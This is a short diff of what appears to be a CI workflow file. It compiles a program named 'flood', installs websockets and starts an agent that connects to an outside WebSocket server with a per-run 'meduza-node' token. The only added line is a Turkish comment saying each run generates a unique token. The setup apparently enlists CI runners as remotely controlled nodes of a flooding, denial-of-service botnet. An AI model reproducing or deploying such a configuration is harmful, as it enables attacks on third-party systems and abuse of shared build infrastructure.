@@ -26,4 +26,5 @@ jobs:
           gcc -O2 -o flood flood.c -lpthread
           pip3 install -q websockets
           
+          # HER RUN'DA BENZERSİZ TOKEN OLUŞTURUR
           python3 -u agent.py wss://bg9vrv2nkw.apps.bot-hosting.cloud/agent-ws meduza-node-secret-${{ github.run_id }}-node${{ matrix.node }} /tmp/meduza/flood
